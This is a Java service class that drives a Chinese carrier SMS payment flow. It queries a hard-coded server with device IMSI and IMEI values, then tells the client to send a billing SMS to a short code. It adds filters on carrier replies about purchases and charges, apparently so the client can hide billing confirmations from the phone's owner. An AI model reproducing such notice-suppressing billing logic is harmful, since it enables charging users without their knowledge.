package com.jxt.pay.appclient.service.dynamic.net;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * mm强联网对接文档说明

	
 * 
 * @author leoliu
 *
 */
public class HhkjMm5DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjMm5DynamicService.class);
	
	private static final String TYPE = "lxtxSmm3";
	
	private static final String PARAM1 = "{\"appid\":\"{appid}\",\"imsi\":\"{imsi}\",\"imei\":\"{imei}\",\"ua\":\"HTCOne\"}";
	private static final String PARAM2 = "{\"sid\":\"{sid}\",\"imsi\":\"{imsi}\",\"imei\":\"{imei}\",\"ua\":\"HTCOne\",\"appid\":\"{appid}\",\"channel\":\"{channelid}\",\"paycode\":\"{paycode}\"}";
	
	private static final String DEST = "10658424";
	
	private static final String DEDAULT_CHANNEL_ID = "0000000000";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		try{
			if("1".equals(theNo)){
				return firstDynamic(map);
			}else if("2".equals(theNo)){
				return secondDynamic(map);
			}
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return null;
	}
	
	public String firstDynamic(Map<String, String> map) throws Exception {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String appid = StringUtils.defaultString(map.get("appid"));
			
			String param = PARAM1.replace("{imsi}",imsi).replace("{imei}",imei).replace("{appid}",appid);
			
			String responseTxt = GetData.getData(url+URLEncoder.encode(param,"utf-8"));
			
			xml = parseFirst(map,responseTxt);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseFirst(Map<String, String> map,String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){

			logger.info("parse first : "+responseTxt);
			
			if(responseTxt.contains("ok")){
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue("");
				
				return XstreamHelper.toXml(sets).toString();
			}else if(responseTxt.contains("no")){
				return null;
			}else if(responseTxt.contains("MM#WLAN")){
				int pos = responseTxt.indexOf("MM#WLAN");
				
				if(pos > 0){
					responseTxt = responseTxt.substring(pos);
				}
				
				Sms sms = new Sms();
				
				sms.setSmsContent(responseTxt);
				sms.setSmsDest(DEST);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				String sid = fetchSid(responseTxt);
				
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue(sid);
				
				return XstreamHelper.toXml(sms).append(XstreamHelper.toXml(sets)).append("<wait>5</wait>").toString();
			}
		}
		
		return null;
	}
	
	private static String fetchSid(String content){
		
		if(content != null && content.length() > 0){
			int pos0 = content.lastIndexOf("#");
			
			String aa = content.substring(0,pos0);
			
			pos0 = aa.lastIndexOf("#");
			
			return aa.substring(pos0+1);
		}
		
		return null;
	}
	
	private Map<String, Integer> tryMap1 = new HashMap<String, Integer>();
	
	private String secondDynamic(Map<String, String> map) throws Exception{
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String sid = StringUtils.defaultString(map.get("sid"));
			
			{				
				String paycode = StringUtils.defaultString(map.get("paycode"));
				String imsi = StringUtils.defaultString(map.get("imsi"));
				String imei = StringUtils.defaultString(map.get("imei"));
				String channelid = StringUtils.defaultString(map.get("channelid"));
				String appid = map.get("appid");
				
				String param = PARAM2.replace("{paycode}",paycode).replace("{imsi}",imsi).replace("{imei}",imei).replace("{appid}",appid).replace("{channelid}",channelid).replace("{sid}",sid);
				
				String responseJson = GetData.getData(url+URLEncoder.encode(param,"utf-8"));
				
				xml = parseSecond(map,responseJson);
				
				if(xml != null && xml.length() > 0){
					tryMap.remove(sid);
				}else{
					logger.info("responseXml is null");
					
					if(sid.equals("")){
						return DynamicUtils.parseError("599");
					}
					
					Integer tryCnt = tryMap1.get(sid);
					
					if(tryCnt == null){
						tryCnt = 1;
						tryMap1.put(sid,tryCnt);
					}else{
						tryCnt ++;
						if(tryCnt >= 2){
							tryMap1.remove(sid);
							return DynamicUtils.parseError("599");
						}
					}
					
					return DynamicUtils.parseWait(10,map);
				}
			}
			
		}
		
		return xml;
	}
	
	//{"initstat":"1","status":"-4","tradeid":"0"}
	private String parseSecond(Map<String, String> map,String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			logger.info("parse second : "+responseJson);
			
			try{
				int pos = responseJson.indexOf("{");
				
				if(pos > 0){
					responseJson = responseJson.substring(pos);
				}
				
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if(status.equals("0")){
					Sms sms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					guardList.add(guard1);
					guardList.add(guard2);
					guardList.add(guard3);
					guardList.add(guard4);
					
					sms.setGuardList(guardList);
					
					return XstreamHelper.toXml(sms).toString();
				}else{
					return DynamicUtils.parseError(status);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test2();
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://112.74.106.240:7878/port/SInit/");
		map.put("channel", "106208a001001001");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		map.put("theNo","1");
		map.put("type","hhkjMm5");
		map.put("appid","5151017");
		
		String xml = new HhkjMm5DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://112.74.106.240:7878/port/Sbill/");
		map.put("channel", "106208a001001001");
		
//		map.put("imei","862949029214504");
//		map.put("imsi", "460022101441340");
		map.put("imei","869460011612203");
		map.put("imsi", "460025284891073");
		
		map.put("theNo","2");
		map.put("type","hhkjMm5");
		
		map.put("sid","");
		map.put("channelid","1");
		map.put("paycode","3");
		map.put("appid","5151017");
		
		String xml = new HhkjMm5DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
}
